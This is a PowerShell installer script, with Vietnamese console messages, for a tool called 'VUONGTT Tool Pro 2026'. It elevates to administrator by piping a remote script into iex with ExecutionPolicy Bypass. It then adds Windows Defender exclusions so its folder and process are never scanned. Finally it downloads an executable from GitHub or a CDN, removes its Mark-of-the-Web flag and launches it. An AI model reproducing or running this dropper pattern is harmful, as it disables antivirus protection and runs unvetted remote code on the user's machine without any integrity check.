$Host.UI.RawUI.WindowTitle = "VUONGTT Tool Pro 2026 - Cloud Bootstrapper"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13 -bor [System.Net.SecurityProtocolType]::Tls

Clear-Host
Write-Host ""
Write-Host " ====================================================================== " -ForegroundColor DarkYellow
Write-Host "       VUONGTT TOOL PRO 2026 - HE THONG KY THUAT VIEN DA NANG       " -ForegroundColor Yellow -BackgroundColor Black
Write-Host " ====================================================================== " -ForegroundColor DarkYellow
Write-Host "   Phat trien boi: Truong Thanh Vuong                                   " -ForegroundColor Gray
Write-Host "   Kho luu tru:    https://github.com/truongthanhvuong/toolwindows      " -ForegroundColor DarkCyan
Write-Host " ---------------------------------------------------------------------- " -ForegroundColor DarkGray

# 1. KIEM TRA VA YEU CAU QUYEN QUAN TRI VIEN (ADMINISTRATOR)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "`n [*] Dang yeu cau quyen quan tri vien (Run as Administrator)..." -ForegroundColor Yellow
    Write-Host " [*] Vui long bam 'YES' tren hop thoai UAC de cap phep hoat dong.`n" -ForegroundColor Cyan
    
    $psBootstrapCmd = "& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; irm https://raw.githubusercontent.com/truongthanhvuong/toolwindows/main/win.ps1 | iex }"
    try {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$psBootstrapCmd`"" -Verb RunAs
        Exit
    } catch {
        Write-Host " [!] Ban da tu choi cap quyen Administrator. Bo cong cu yeu cau quyen Admin de can thiep he thong!" -ForegroundColor Red
        return
    }
}

# 2. THIET LAP VUNG CAI DAT AN TOAN & CAU HINH WINDOWS DEFENDER EXCLUSION
Write-Host "`n [1/4] Thiet lap vung luu tru an toan & Dang ky ngoai le Windows Defender..." -ForegroundColor Cyan
$installDir = Join-Path $env:ProgramData "VUONGTT_Toolkit"
$exePath    = Join-Path $installDir "VUONGTT_Toolkit.exe"

if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
}

# Them Exclusion truc tiep vao Windows Defender de Defender KHONG BAO GIO scan hoac xoa file
try {
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "VUONGTT_Toolkit.exe" -ErrorAction SilentlyContinue
    Write-Host "  -> Da bao ve an toan thu muc va tien trinh khoi Windows Defender (Chong xoa nham)" -ForegroundColor Green
} catch {
    Write-Host "  -> Khong the goi Add-MpPreference (Co the Defender da bi tat hoac dung AV khac)" -ForegroundColor Gray
}

# 3. KIEM TRA VA TAI BAN MOI NHAT TU GITHUB / CDN
Write-Host "`n [2/4] Dang kiem tra va dong bo ban phat hanh moi nhat tu Cloud..." -ForegroundColor Cyan

$urls = @(
    "https://raw.githubusercontent.com/truongthanhvuong/toolwindows/main/VUONGTT_Toolkit.exe",
    "https://cdn.jsdelivr.net/gh/truongthanhvuong/toolwindows@main/VUONGTT_Toolkit.exe"
)

$downloadSuccess = $false
$tempDownload = Join-Path $installDir "VUONGTT_Toolkit_dl.exe"
if (Test-Path $tempDownload) { Remove-Item $tempDownload -Force -ErrorAction SilentlyContinue }

foreach ($url in $urls) {
    try {
        Write-Host "  -> Dang ket noi: $url" -ForegroundColor Gray
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "VUONGTT-Cloud-Bootstrapper/2026")
        $wc.DownloadFile($url, $tempDownload)

        if ((Test-Path $tempDownload) -and ((Get-Item $tempDownload).Length -gt 500000)) {
            $downloadSuccess = $true
            break
        }
    } catch {
        Write-Host "  [!] Ket noi link nay khong thanh conc, dang thu nguon du phong..." -ForegroundColor DarkYellow
    }
}

if ($downloadSuccess) {
    try {
        # Unblock file truoc khi di chuyen (Xoa co Mark-of-the-Web Zone.Identifier)
        Unblock-File -Path $tempDownload -ErrorAction SilentlyContinue

        # Neu tien trinh cu dang chay, dung lai de ghi de
        Get-Process -Name "VUONGTT_Toolkit" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 400

        Move-Item -Path $tempDownload -Destination $exePath -Force
        Unblock-File -Path $exePath -ErrorAction SilentlyContinue

        $sizeMb = [math]::Round(((Get-Item $exePath).Length / 1MB), 2)
        Write-Host "  -> Tai ve thanh cong! Dung luong: $sizeMb MB" -ForegroundColor Green
    } catch {
        Write-Host "  [!] Khong the ghi de file EXE: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    if (Test-Path $exePath) {
        Write-Host "  -> Khong the tai ban moi nhung da co ban cai dat san truoc do. Su dung ban hien co." -ForegroundColor Yellow
    } else {
        Write-Host "  [LOI NGUY HIEM] Khong the tai duoc VUONGTT_Toolkit.exe tu may chu Cloud! Vui long kiem tra mang." -ForegroundColor Red
        return
    }
}

# 4. TAO SHORTCUT TREN DESKTOP
Write-Host "`n [3/4] Dang tao loi tat (Desktop Shortcut) de tien su dung..." -ForegroundColor Cyan
try {
    $wsh = New-Object -ComObject WScript.Shell
    $desktops = @(
        [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop),
        [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::CommonDesktop)
    )
    foreach ($desk in $desktops) {
        if (Test-Path $desk) {
            $shortcutPath = Join-Path $desk "VUONGTT Tool Pro 2026.lnk"
            $shortcut = $wsh.CreateShortcut($shortcutPath)
            $shortcut.TargetPath = $exePath
            $shortcut.WorkingDirectory = $installDir
            $shortcut.Description = "Bo cong cu ky thuat vien da nang VUONGTT Tool Pro 2026"
            $shortcut.Save()
        }
    }
    Write-Host "  -> Da tao bieu tuong tren man hinh Desktop!" -ForegroundColor Green
} catch {
    Write-Host "  [!] Khong the tao shortcut: $($_.Exception.Message)" -ForegroundColor Gray
}

# 5. KHOI CHAY UNG DUNG
Write-Host "`n [4/4] Khoi dong VUONGTT Tool Pro 2026..." -ForegroundColor Cyan
try {
    Start-Process -FilePath $exePath -WorkingDirectory $installDir
    Write-Host "`n ====================================================================== " -ForegroundColor Green
    Write-Host "  [OK] KHOI CHAY THANH CONG! VUONGTT TOOL PRO 2026 DA DUOC MO TREN MAN HINH" -ForegroundColor Green
    Write-Host "  [OK] Lan sau ban chi can click dup vao bieu tuong ngoai Desktop." -ForegroundColor Yellow
    Write-Host " ====================================================================== `n" -ForegroundColor Green
} catch {
    Write-Host "  [!] Khong the khoi chay file EXE: $($_.Exception.Message)" -ForegroundColor Red
}
